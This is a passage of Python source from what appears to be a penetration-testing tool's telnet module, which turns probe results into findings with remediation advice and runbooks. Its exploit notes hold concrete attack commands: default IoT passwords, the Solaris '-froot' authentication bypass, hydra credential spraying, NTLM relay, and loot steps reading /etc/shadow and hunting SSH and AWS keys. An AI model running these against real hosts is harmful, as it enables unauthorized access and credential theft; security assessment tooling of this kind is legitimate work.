                    f"{pr.get('vendor_desc','')}. Banner: {banner[:200]}",
                    "telnet", f"telnet {h.ip} {p.portid}",
                    "N/A — feeds the vendor-specific runbook (default creds, "
                    "known CVEs, identity commands).",
                    ["CWE-200"], kind="telnet_vendor_fingerprint",
                    exploit_note=(
                        "telnet IP 23 -- read banner ; consult vendor default-cred "
                        "sheet ; try appropriate defaults with active_attacks=True"),
                    depth_tier="t0"))

            # 6) known-bad build map
            for rx, (sev, title, detail, cwes, kind, cmd) in _KNOWN_BAD:
                if banner and rx.search(banner):
                    out.append(_finding(
                        sev, title, tgt,
                        f"Banner: {banner[:200]}. {detail}",
                        "metasploit / manual", cmd,
                        "Upgrade to a vendor-clean, current build; the current "
                        "one is compromised/vulnerable. Rotate every "
                        "credential the host held.", cwes, kind=kind,
                        exploit_note=(
                            "For SunOS 5.10: telnet -l -froot IP ; for BusyBox/"
                            "embedded: try root:xc3511, root:vizxv, root:root; "
                            "for netkit CVE-2020-10188: search github for "
                            "encrypt_keyid PoC."),
                        depth_tier="t0"))
                    break

            # 7) NTLM AV_PAIR
            ntlm = pr.get("ntlm") or {}
            if ntlm:
                bits = ", ".join(f"{k}={v}" for k, v in ntlm.items())
                out.append(_finding(
                    "high",
                    "Telnet AUTHENTICATION NTLM AV_PAIR leak", tgt,
                    "The Windows Telnet Server's AUTHENTICATION option "
                    "returned an NTLMSSP CHALLENGE_MESSAGE. Its AV_PAIR "
                    f"fields disclosed: {bits}",
                    "impacket", f"impacket-ntlmrelayx -t telnet://{h.ip}",
                    "Disable telnet on Windows (Turn Off Telnet Server), or "
                    "at minimum disable the AUTHENTICATION option so NTLM is "
                    "not offered pre-auth.", ["CWE-200"],
                    kind="telnet_ntlm_info_leak",
                    exploit_note=(
                        "kerbrute userenum -d <dns_domain> --dc <dns_computer> "
                        "users.txt ; impacket-lookupsid <user>@<dns_computer> "
                        "-no-pass"),
                    depth_tier="t2"))

            # 8) telnets-over-TLS
            if pr.get("tls"):
                out.append(_finding(
                    "info", "Telnet-over-TLS (telnets) detected", tgt,
                    f"IAC negotiation completed inside a TLS tunnel on "
                    f"{p.portid}. Rare — usually a legacy printer, Cisco "
                    "device or bespoke appliance.",
                    "openssl s_client",
                    f"openssl s_client -connect {h.ip}:{p.portid}",
                    "Prefer SSH over telnet-in-TLS wherever the endpoint "
                    "supports it.", ["CWE-200"], kind="telnet_over_tls",
                    exploit_note=(
                        "openssl s_client -connect IP:992 -- then interact as "
                        "normal telnet."),
                    depth_tier="t0"))

            # 9) AYT liveness (info-only)
            if pr.get("ayt_ok"):
                out.append(_finding(
                    "info", "Telnet peer confirmed via IAC AYT", tgt,
                    "IAC AYT (byte 246) elicited a response — the peer really "
                    "speaks telnet and is not a raw-banner squatter.",
                    "telnet", f"telnet {h.ip} {p.portid}   # ^] send ayt",
                    "N/A — disambiguation only.", ["CWE-200"],
                    kind="telnet_ayt_liveness",
                    exploit_note=(
                        "telnet IP 23 ; ^] ; send ayt -- expect a text "
                        "response"),
                    depth_tier="t0"))

            # 10) sniff runbook (chain finding, always fires for open telnet)
            out.append(_finding(
                "high", "Telnet on-path capture yields creds in cleartext", tgt,
                "Any capture of this segment — tcpdump 'tcp port "
                f"{p.portid}' — records USER, PASS and every keystroke in "
                "cleartext. Motivates the segmentation / MITM writeup: anyone "
                "on-path already has these credentials.",
                "tcpdump", f"tcpdump -i <iface> -A -s0 'tcp port {p.portid} "
                f"and host {h.ip}'",
                "Segment management traffic onto a dedicated OOB network; "
                "replace telnet with SSH end-to-end.",
                ["CWE-319", "CWE-311"], kind="telnet_sniff_runbook",
                exploit_note=(
                    "tcpdump -i any -A -s0 'tcp port 23 and host IP' ; "
                    "strings capture.pcap | grep -i -E 'user|pass|login'"),
                depth_tier="t0"))

            # 11) default-cred hits (only present when the gated sweep ran and
            # something actually authenticated)
            for hit in pr.get("default_creds") or []:
                out.append(_finding(
                    "critical",
                    f"Telnet accepted default credentials ({hit['user']}:"
                    f"{hit['password'] or '<blank>'})", tgt,
                    f"Login succeeded as {hit['user']} with password "
                    f"'{hit['password']}' — post-auth shell established. "
                    f"Evidence: {hit.get('evidence','')[:200]}",
                    "telnet", f"telnet -l {hit['user']} {h.ip} {p.portid}",
                    "Change every default credential; disable telnet "
                    "entirely. Spray the same pair against SSH/HTTP-admin/"
                    "SNMP/FTP on this host and the segment — embedded "
                    "devices share creds ruthlessly.",
                    ["CWE-798", "CWE-521"], kind="telnet_default_creds",
                    exploit_note=(
                        "hydra -l <user> -p <pass> ssh://IP,http-get://IP/,"
                        "snmp://IP,ftp://IP ; on device: 'show running-config | "
                        "inc snmp|enable secret|username' (Cisco) or wget backup"),
                    depth_tier="t3"))

            # 12) Solaris -f bypass hit
            solaris = pr.get("solaris_dashf") or {}
            if solaris.get("success"):
                out.append(_finding(
                    "critical",
                    "Solaris in.telnetd -f authentication bypass (CVE-2007-0882)",
                    tgt,
                    "Connecting with USER=-froot bypassed authentication and "
                    "reached a shell prompt — CVE-2007-0882 confirmed.\n"
                    f"Evidence: {solaris.get('evidence','')[:300]}",
                    "telnet", f"telnet -l -froot {h.ip}",
                    "Patch to a Solaris 10 build with the CVE-2007-0882 fix, "
                    "or replace with SSH.", ["CWE-88", "CWE-287"],
                    kind="telnet_solaris_dashf_rce",
                    exploit_note=(
                        "telnet -l -froot IP ; then: uname -a; id; cat /etc/"
                        "shadow; find / -name id_rsa -o -name .aws 2>/dev/null; "
                        "cp /var/adm/messages loot/"),
                    depth_tier="t3"))

            # 13) credentialed shell (if the caller supplied captures)
            for cap in pr.get("cred_captures") or []:
                out.append(_finding(
                    "high", "Telnet credentialed shell — host identity captured",
                    tgt,
                    "Post-auth session captured host identity for "
                    f"known_hostnames/known_users:\n{cap.get('output','')[:400]}",
                    "telnet", f"telnet -l {cap.get('user','<user>')} {h.ip} "
                    f"{p.portid}",
                    "N/A — foothold; feeds known_users/known_hostnames.",
                    ["CWE-522"], kind="telnet_credentialed_shell",
                    exploit_note=(
                        "After telnet_default_creds hit: telnet -l <user> IP + "
                        "send: id; uname -a; hostname; cat /etc/passwd -- feed "
                        "output into known_users."),
                    depth_tier="t3"))

            # 14) timing user-enum results
            valid_timing = [r for r in (pr.get("timing_enum") or [])
                            if r.get("valid")]
            if valid_timing:
                names = ", ".join(r["user"] for r in valid_timing)
                out.append(_finding(
                    "medium",
                    "Telnet login-prompt timing distinguishes valid users", tgt,
                    "The password-prompt wall-clock differs materially for "
                    "existing vs. non-existing usernames — pre-auth user "
                    f"enumeration. Valid: {names}",
                    "custom", f"telnet {h.ip} {p.portid}   # measured baseline "
                    "vs candidate elapsed",
                    "Configure the telnet/PAM stack to normalise the "
                    "invalid-user path timing (a dummy hash compare on missing "
                    "users). Better: replace telnet with SSH and disable this "
                    "channel entirely.", ["CWE-208", "CWE-203"],
                    kind="telnet_user_enum_timing",
                    exploit_note=(
                        "Call recce.services.telnet.timing_user_enum manually "
                        "with a candidate list; feed valid= users to "
                        "hydra -L <file> -P rockyou.txt telnet://IP."),
                    depth_tier="t1"))
    return out


# --- runbooks -------------------------------------------------------------------

def credfree_runbook(ip: str, port: int) -> list[dict]:
    return [
        {"phase": "recon", "tool": "nmap NSE",
         "command": f"nmap -p{port} --script telnet-encryption,telnet-ntlm-info,"
         f"telnet-brute {ip}",
         "why": "Encryption posture + NTLM AV_PAIR + light brute-force sweep."},
        {"phase": "recon", "tool": "telnet",
         "command": f"telnet {ip} {port}",
         "why": "Read the banner and login-prompt style; note IAC options."},
        {"phase": "capture", "tool": "tcpdump",
         "command": f"tcpdump -i <iface> -A -s0 'tcp port {port} and host {ip}'",
         "why": "Any legitimate login on this port surrenders creds in the clear."},
    ]


def cred_runbook(ip: str, port: int, creds: dict | None) -> list[dict]:
    user = (creds or {}).get("user") or "<user>"
    pwd = (creds or {}).get("secret") or "<pass>"
    return [
        {"phase": "enumerate", "tool": "telnet",
         "command": f"telnet -l {user} {ip} {port}   # password: {pwd}",
         "why": "Interactive shell."},
        {"phase": "loot (linux)", "tool": "shell",
         "command": "uname -a; id; hostname; cat /etc/passwd; cat /etc/shadow "
         "2>/dev/null",
         "why": "Host identity + local user list + hashes if readable."},
        {"phase": "loot (cisco)", "tool": "iosh",
         "command": "show version | inc IOS; show running-config | inc "
         "^username|snmp-server community|enable secret",
         "why": "OS/version, local users, SNMP RO/RW, enable-secret hashes "
         "(hashcat -m 500 / 9200)."},
    ]


# --- top-level analyze ----------------------------------------------------------

def findings_to_vulns(fs: list[dict]) -> dict:
    from .svccommon import findings_to_vulns as _f2v
    return _f2v(fs, "telnet", _DEFAULT_PORT)


def analyze(hosts: list[Host], creds: dict | None = None, active: bool = True,
            budget: float | None = None, progress=None,
            active_attacks: bool | None = None) -> dict:
    """Full telnet analysis. `active_attacks` is the gate for the default-cred
    sweep and Solaris -f bypass; None falls back to RECCE_ACTIVE_ATTACKS env."""
    from . import svcprobe
    targets = telnet_targets(hosts)
    probes: dict = {}
    state: dict = {}
    if active:
        def _probe_one(t):
            pr = probe(t["ip"], t["port"], use_tls=bool(t.get("tls")))
            if not pr:
                return None
            if active_attacks is True or _active_gate():
                vendor = pr.get("vendor", "unknown")
                pr["default_creds"] = default_cred_sweep(
                    t["ip"], t["port"], vendor,
                    active_attacks=active_attacks)
                if vendor == "solaris":
                    pr["solaris_dashf"] = solaris_dashf_bypass(
                        t["ip"], t["port"], active_attacks=active_attacks)
            return pr
        for t, pr in svcprobe.iter_probe(
                targets, _probe_one,
                budget=budget, progress=progress, state=state):
            if pr:
                probes[(t["ip"], t["port"])] = pr
                t["banner"] = pr.get("banner", "")
                t["vendor"] = pr.get("vendor", "")
                t["environ_leak"] = pr.get("environ_leak") or {}
                # RFC 854 telnet has no transport crypto at all — a probe
                # that identifies a telnet server IS a cleartext-auth
                # exposure. Skip when the connection was tunneled over TLS
                # (telnets/992) since the wire is protected there.
                if pr.get("looks_like_telnet") and not pr.get("tls"):
                    from ..core.cleartext_creds import record_cleartext_auth
                    for _h in hosts:
                        if _h.ip == t["ip"]:
                            record_cleartext_auth(_h, t["port"], "telnet",
                                                  "password",
                                                  source="telnet:probe")
                            break
                # Feed the cross-service vendor correlator. A concrete
                # _VENDOR_TABLE match (banner regex) is medium confidence;
                # "unknown" is dropped by the reader.
                v = pr.get("vendor") or ""
                if v and v != "unknown":
                    from ..core.known_vendors import record_vendor
                    for h in hosts:
                        if h.ip == t["ip"]:
                            record_vendor(h, t["port"], v,
                                          source="telnet:banner",
                                          confidence="medium")
                            break
    fs = findings(hosts, probes)
    runbooks = [{"target": f"{t['ip']}:{t['port']}", "ip": t["ip"],
                 "credfree": credfree_runbook(t["ip"], t["port"]),
                 "credentialed": cred_runbook(t["ip"], t["port"], creds)}
                for t in targets]
    return {"targets": targets, "findings": fs, "runbooks": runbooks,
            "probes": {f"{k[0]}:{k[1]}": v for k, v in probes.items()},
            "stats": {"targets": len(targets), "findings": len(fs),
                      "stopped": state.get("stopped")}}
